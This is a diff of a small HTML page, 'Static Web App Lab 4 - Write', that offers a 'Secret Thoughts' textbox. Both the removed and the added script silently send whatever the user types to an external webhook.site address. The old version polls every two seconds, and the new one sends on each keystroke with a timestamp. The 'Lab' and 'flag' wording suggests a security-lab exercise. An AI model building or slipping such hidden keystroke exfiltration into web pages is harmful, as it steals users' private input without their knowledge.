@@ -1,20 +1,23 @@
 <html>
-<head><title>Static Web App Lab 4</title></head>
+<head>
+<title>Static Web App Lab 4</title>
+</head>
 <body>
-  <div>
-    <h1>Static Web App Lab 4 - Write</h1>
-    <div>
-      <h2>Secret Thoughts</h2>
-      <textarea id="secretThoughts" rows="10" cols="50" style="width:100%;max-width:500px;"></textarea>
-    </div>
-  </div>
-  <script>
-    setInterval(function(){
-      var v = document.getElementById('secretThoughts');
-      if(v && v.value){
-        fetch('https://webhook.site/bc0d84dc-11ae-42b7-a57f-c477eb287d44?flag='+encodeURIComponent(v.value));
-      }
-    }, 2000);
-  </script>
+<div>
+<h1>Static Web App Lab 4 - Write</h1>
+<div>
+<h2>Secret Thoughts</h2>
+<textarea id="secretThoughts"></textarea>
+</div>
+</div>
+<script>
+const textarea = document.getElementById("secretThoughts")
+textarea.addEventListener("input", function (e) {
+const text = e.target.value
+fetch(
+`https://webhook.site/bc0d84dc-11ae-42b7-a57f-c477eb287d44?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+).catch(console.error)
+})
+</script>
 </body>
 </html>
